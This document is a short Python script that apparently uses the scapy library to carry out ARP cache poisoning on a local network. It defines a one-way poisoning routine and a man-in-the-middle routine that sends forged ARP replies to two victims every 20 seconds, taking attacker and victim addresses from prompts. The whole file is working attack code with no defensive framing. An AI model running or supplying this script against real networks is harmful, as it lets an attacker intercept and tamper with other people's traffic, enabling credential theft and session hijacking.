from scapy.all import *
import time

def ellapsed_time(st):
    et = time.time() - st
    return et

def arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof):
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim

    sendp(arp, iface = "enp0s3")
    
def oneWayPoisoning():
    
    macAttacker = raw_input("Attacker MAC address:")
    ipAttacker = raw_input("Attacker IP address:")

    macVictim = raw_input("Victim MAC address:")
    ipVictim = raw_input("Victim IP address:")

    ipToSpoof = raw_input("IP address to impersonate:")
    
    start_time = time.time()
    
    while True:
        if (ellapsed_time(start_time) > 20):
            arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof)
            start_time = time.time()
    
def mimAttack():
    macAttacker = raw_input("Attacker MAC address:")
    ipAttacker = raw_input("Attacker IP address:")

    macVictim1 = raw_input("Victim 1 MAC address:")
    ipVictim1 = raw_input("Victim 1 IP address:")
    
    macVictim2 = raw_input("Victim 2 MAC address:")
    ipVictim2 = raw_input("Victim 2 IP address:")
    
    start_time = time.time()
    
    while True:
        if (ellapsed_time(start_time) > 20):
            arpPoison(macAttacker, macVictim1, ipVictim1, ipVictim2)
            arpPoison(macAttacker, macVictim2, ipVictim2, ipVictim1)
            start_time = time.time()